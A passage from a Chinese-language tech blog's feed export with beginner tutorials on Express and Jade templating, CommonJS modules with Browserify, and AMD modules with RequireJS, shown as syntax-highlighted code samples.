href="#设置页面数据和渲染文件" class="headerlink" title="设置页面数据和渲染文件"></a>设置页面数据和渲染文件</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> data = &#123;</div><div class="line">        title: <span class="string">'Express'</span>,</div><div class="line">        message: <span class="string">'Hello earth!'</span></div><div class="line">    &#125;;</div><div class="line">    res.render(<span class="string">'index'</span>, data);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>不适用引擎渲染时则使用 <code>res.sendFile</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">res.sendFile(path.join(__dirname + <span class="string">'/view/index'</span>));</div></pre></td></tr></table></figure><h4 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app.listen(port);</div></pre></td></tr></table></figure><h4 id="Jade-模板"><a href="#Jade-模板" class="headerlink" title="Jade 模板"></a>Jade 模板</h4><p><code>views/index.jade</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">doctype html</div><div class="line">html(lang=&apos;en-US&apos;)</div><div class="line">    head</div><div class="line">    meta(charset=&apos;utf-8&apos;)</div><div class="line">    link(rel=&apos;stylesheet&apos;, href=&apos;static/css/bootstrap.min.css&apos;)</div><div class="line">    title #&#123;title&#125;</div><div class="line">    body</div><div class="line">    .container</div><div class="line">        header.jumbotron</div><div class="line">        h1 #&#123;message&#125;</div><div class="line"></div><div class="line">    include common-js</div></pre></td></tr></table></figure><p><code>common-js.jade</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">script(type=&apos;text/javascript&apos;, src=&apos;static/js/jquery.js&apos;)</div><div class="line">script(type=&apos;text/javascript&apos;, src=&apos;static/js/bootstrap.min.js&apos;)</div></pre></td></tr></table></figure><blockquote><p>延伸阅读：<a href="https://scotch.io/tutorials/build-a-restful-api-using-node-and-express-4" target="_blank" rel="external">Build a RESTful API Using Node and Express 4</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;创建-package-json&quot;&gt;&lt;a href=&quot;#创建-package-json&quot; class=&quot;headerlink&quot; title=&quot;创建 package.json&quot;&gt;&lt;/a&gt;创建 package.json&lt;/h4&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;express-basis&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;main&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;service.js&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;body-parser&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.13.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;express&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^4.13.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;jade&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.11.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;mongoose&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^4.1.4&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;morgan&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.6.1&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;underscore&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.8.3&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;body-parser 是为了取得 &lt;code&gt;req.body.param&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;express 是框架。&lt;/li&gt;
&lt;li&gt;jade 是渲染引擎。&lt;/li&gt;
&lt;li&gt;mongoose 操作 &lt;strong&gt;MongoDB&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;morgan 输出访问信息。&lt;/li&gt;
&lt;li&gt;underscore 是&lt;strong&gt;神器&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="NodeJS" scheme="http://youngdze.co/categories/NodeJS/"/>
    
    
      <category term="Express" scheme="http://youngdze.co/tags/Express/"/>
    
  </entry>
  
  <entry>
    <title>CommonJS 基础</title>
    <link href="http://youngdze.co/2015/08/31/commonjs-basis/"/>
    <id>http://youngdze.co/2015/08/31/commonjs-basis/</id>
    <published>2015-08-31T13:41:36.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>CommonJS</strong> 被设计来针对服务端，不过现在可以通过 <strong><a href="http://browserify.org/" target="_blank" rel="external">Browserify</a></strong> 转变给客户端使用，如有这方面的需求，更建议使用 <strong><a href="http://webpack.github.io/" target="_blank" rel="external">webpack</a></strong>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">browserify .\main.js .\foo.js -o .\bundle.js</div></pre></td></tr></table></figure><a id="more"></a><p><strong>安装模块</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install uniq</div></pre></td></tr></table></figure><p><strong>定义模块</strong> <code>foo.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</div><div class="line">    arr.reverse();</div><div class="line">    <span class="built_in">console</span>.log(arr);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = foo;</div></pre></td></tr></table></figure><p><strong>使用模块</strong> <code>main.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> unique = <span class="built_in">require</span>(<span class="string">'uniq'</span>);</div><div class="line"><span class="keyword">var</span> foo = <span class="built_in">require</span>(<span class="string">'./foo.js'</span>);</div><div class="line"><span class="keyword">var</span> data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>];</div><div class="line">foo(data);</div><div class="line"><span class="built_in">console</span>.log(unique(data));</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;CommonJS&lt;/strong&gt; 被设计来针对服务端，不过现在可以通过 &lt;strong&gt;&lt;a href=&quot;http://browserify.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Browserify&lt;/a&gt;&lt;/strong&gt; 转变给客户端使用，如有这方面的需求，更建议使用 &lt;strong&gt;&lt;a href=&quot;http://webpack.github.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;webpack&lt;/a&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;browserify .\main.js .\foo.js -o .\bundle.js&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>AMD 和 RequireJS</title>
    <link href="http://youngdze.co/2015/08/31/amd-and-requirejs/"/>
    <id>http://youngdze.co/2015/08/31/amd-and-requirejs/</id>
    <published>2015-08-31T12:35:11.000Z</published>
    <updated>2016-12-05T11:40:32.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘录自：<a href="https://code.tutsplus.com/tutorials/next-generation-javascript-with-amd-and-requirejs--net-21596" target="_blank" rel="external">Next Generation JavaScript with AMD and RequireJS</a></p></blockquote><h3 id="为了解决的问题"><a href="#为了解决的问题" class="headerlink" title="为了解决的问题"></a>为了解决的问题</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file2.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file3.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h3 id="异步模块定义-Asynchronous-Module-Definition-as-AMD"><a href="#异步模块定义-Asynchronous-Module-Definition-as-AMD" class="headerlink" title="异步模块定义 (Asynchronous Module Definition as AMD)"></a>异步模块定义 (Asynchronous Module Definition as AMD)</h3><p><code>dom/events.js</code> 定义模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">define(&#123;</div><div class="line">    addEvent: <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (el.addEventListener) &#123;</div><div class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.addEventListener(evt, fn, <span class="literal">false</span>);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (el.attachEvent) &#123;</div><div class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.attachEvent(<span class="string">"on"</span> + evt, fn);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el[<span class="string">"on"</span> + evt] = fn;</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.addEvent(el, evt, fn);</div><div class="line">    &#125;,</div><div class="line">    removeEvent: <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (el.removeEventListener) &#123;</div><div class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.removeEventListener(evt, fn, <span class="literal">false</span>);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (el.detachEvent) &#123;</div><div class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.removeEvent(<span class="string">"on"</span> + evt, fn);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el[<span class="string">"on"</span> + evt] = fn;</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.removeEvent(el, evt, fn);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p><code>main.js</code> 使用 <strong>RequireJS</strong> 加载模块，模块不需要后缀</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">require</span>([<span class="string">"dom/events"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line"></div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>在 <code>main.js</code> 使用模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">require</span>([<span class="string">"dom/events"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">events</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"target"</span>);</div><div class="line">    events.addEvent(elem, <span class="string">"click"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        alert(<span class="string">"clicked"</span>);</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p><code>index.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Learn Require.js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">"js/main"</span> <span class="attr">src</span>=<span class="string">"js/require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"target"</span>&gt;</span>Learning Require.js<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p>让模块稍微复杂点 <code>dom/events.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// we will add our sugar methods dynamically in here.</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> eventObject;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>再写个 <em>Array.prototype.forEach</em> 兼容方法 <code>utils/array.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> nativeForEach = <span class="function"><span class="keyword">function</span> (<span class="params">list, callback, thisArg</span>) </span>&#123;</div><div class="line">        [].forEach.call(list, callback, thisArg);</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">var</span> customForEach = <span class="function"><span class="keyword">function</span> (<span class="params">list, callback, thisArg</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> T, k = <span class="number">0</span>, o, len, kValue;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">" this is null or not defined"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        O = <span class="built_in">Object</span>(list);</div><div class="line">        len = O.length &gt;&gt;&gt; <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (&#123;&#125;.toString.call(callback) != <span class="string">"[object Function]"</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(callback + <span class="string">" is not a function"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (thisArg) &#123;</div><div class="line">            T = thisArg;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">while</span>(k &lt; len) &#123;</div><div class="line">            <span class="keyword">if</span> (k <span class="keyword">in</span> O) &#123;</div><div class="line">                kValue = O[k];</div><div class="line">                callback.call(T, kValue, O);</div><div class="line">            &#125;</div><div class="line">            k++;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">        forEach: (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (&#123;&#125;.toString.call([].forEach) === <span class="string">"[object Function]"</span>) &#123;</div><div class="line">                <span class="keyword">return</span> nativeForEach;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">return</span> customForEach;</div><div class="line">            &#125;</div><div class="line">        &#125;())</div><div class="line">    &#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>同样使这个模块稍微复杂点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define([<span class="string">"utils/array"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// we will add our sugar methods dynamically in here.</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> eventObject;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>在 <code>dom/events.js</code> 中使用 <code>utils/array.js</code>，添加依赖关系</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">define([<span class="string">"utils/array"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</div><div class="line"></div><div class="line">    array.forEach([<span class="string">"click"</span>, <span class="string">"mouseover"</span>,<span class="string">"mouseout"</span>, <span class="string">"keypress"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</div><div class="line">        eventObject[evt] = <span class="function"><span class="keyword">function</span> (<span class="params">el, fn</span>) </span>&#123;</div><div class="line">            <span class="keyword">this</span>.addEvent(el, evt, fn);</div><div class="line">        &#125;;</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> eventObject;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>在 <code>main.js</code> 使用添加了 <code>utils/array.js</code> 依赖的 <code>dom/events.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">event.click(elem, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="string">"clicked"</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>模块的名字不指定则为模块默认名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">require([&quot;utils/array&quot;], function () &#123;</div><div class="line">    var arr = [1,2,3];</div><div class="line"></div><div class="line">    arrayUtils.forEach(arr, function (item) &#123;</div><div class="line">        // action here</div><div class="line">    &#125;);</div><div class="line">&#125;);</div><div class="line">```javascript</div><div class="line"></div><div class="line">配置 **RequireJS**</div><div class="line"></div><div class="line">`index.html` 加载文件</div><div class="line"></div><div class="line">```html</div><div class="line">&lt;script src=&quot;js/require.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure><p><code>main.js</code> 完整配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">requirejs.config(&#123;</div><div class="line">    baseUrl: <span class="string">'./js'</span>,</div><div class="line">    paths: &#123;</div><div class="line">    jquery: <span class="string">'bower_components/jquery/dist/jquery.min'</span>,</div><div class="line">    underscore: <span class="string">'bower_components/underscore/underscore-min'</span>,</div><div class="line">    angular: <span class="string">'bower_components/angular/angular.min'</span>,</div><div class="line">    bootstrap: <span class="string">"bower_components/bootstrap/dist/js/bootstrap.min"</span>,</div><div class="line">    semantic: <span class="string">"bower_components/semantic-ui/dist/semantic.min"</span>,</div><div class="line">    C: <span class="string">'js/controllers'</span>,</div><div class="line">    S: <span class="string">'js/services'</span>,</div><div class="line">    F: <span class="string">'js/filters'</span>,</div><div class="line">    D: <span class="string">'js/directives'</span></div><div class="line">    &#125;,</div><div class="line">    shim: &#123;</div><div class="line">    jquery: &#123;</div><div class="line">        exports: <span class="string">'$'</span></div><div class="line">    &#125;,</div><div class="line">    underscore: &#123;</div><div class="line">        exports: <span class="string">'_'</span></div><div class="line">    &#125;,</div><div class="line">    angular: &#123;</div><div class="line">        deps: [<span class="string">'jquery'</span>]</div><div class="line">    &#125;,</div><div class="line">    bootstrap: &#123;</div><div class="line">        deps: [<span class="string">'jquery'</span>]</div><div class="line">    &#125;,</div><div class="line">    semantic: &#123;</div><div class="line">        deps: [<span class="string">'jquery'</span>]</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="RequireJS-插件"><a href="#RequireJS-插件" class="headerlink" title="RequireJS 插件"></a><strong>RequireJS</strong> 插件</h3><p>以 <a href="http://requirejs.org/docs/download.html#text" target="_blank" rel="external">text plugin</a> 为例</p><p>把 <a href="http://requirejs.org/docs/download.html#text" target="_blank" rel="external">text.js</a> 放在 <code>main.js</code> 同级目录，在 <code>main.js</code> 请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">require</span>([<span class="string">"text!templates/list.html"</span>, <span class="string">"libs/underscore"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">listTpl</span>) </span>&#123;</div><div class="line">    <span class="comment">// Underscore is loaded globally.</span></div><div class="line">    <span class="keyword">var</span> context = &#123;</div><div class="line">        people : &#123;</div><div class="line">            <span class="string">"Fredrick"</span> : <span class="string">"Back-end Developer"</span>,</div><div class="line">            <span class="string">"Victoria"</span> : <span class="string">"Front-end Developer"</span>,</div><div class="line">            <span class="string">"Hamilton"</span> : <span class="string">"Designer"</span>,</div><div class="line">            <span class="string">"Georgea"</span>  : <span class="string">"Content Strategist"</span></div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    <span class="built_in">document</span>.body.innerHTML =  _.template(listTpl)(context);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p><code>templates/list.html</code> 模板用的是 <strong>Rails</strong> <code>html</code> 模板语法，因为 <strong>underscorejs</strong> 的 <a href="http://underscorejs.org/#template" target="_blank" rel="external">_.template()</a> 默认这种写法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span 